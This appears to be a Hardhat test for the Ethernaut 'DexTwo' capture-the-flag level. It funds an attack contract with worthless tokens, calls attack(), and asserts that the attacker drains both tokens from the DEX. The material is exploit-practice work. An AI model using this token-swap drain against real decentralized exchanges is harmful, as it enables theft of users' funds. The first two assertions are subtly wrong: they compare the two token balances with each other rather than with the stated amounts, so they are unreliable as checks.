const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("23-DexTwo", async function () {
    let attacker, dexTwo, tokenOne, tokenTwo, dexTwoAttack
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        attacker = accounts[1]
        await deployments.fixture(["23"])
        dexTwo = await ethers.getContract("DexTwo", attacker.address)
        dexTwoAttack = await ethers.getContract("DexTwoAttack", attacker.address)
        tokenOne = await ethers.getContractAt(
            "SwappableToken",
            await dexTwo.token1(),
            attacker.address
        )
        tokenTwo = await ethers.getContractAt(
            "SwappableToken",
            await dexTwo.token2(),
            attacker.address
        )
        myToken = await ethers.getContract("SwappableTokenTwo", attacker)
    })
    it("should steal all of token one and token two", async function () {
        assert.equal(
            (await tokenOne.balanceOf(attacker.address)).toString(),
            (await tokenTwo.balanceOf(attacker.address)).toString(),
            ethers.utils.parseEther("10")
        )
        assert.equal(
            (await tokenOne.balanceOf(dexTwo.address)).toString(),
            (await tokenTwo.balanceOf(dexTwo.address)).toString(),
            ethers.utils.parseEther("100")
        )

        // transfer worthless tokens to attack contract
        await myToken.transfer(dexTwoAttack.address, ethers.utils.parseEther("50"))
        // attack
        await dexTwoAttack.attack()

        assert.equal(
            (await tokenOne.balanceOf(attacker.address)).toString(),
            ethers.utils.parseEther("110")
        )
        assert.equal(
            (await tokenTwo.balanceOf(attacker.address)).toString(),
            ethers.utils.parseEther("110")
        )
    })
})
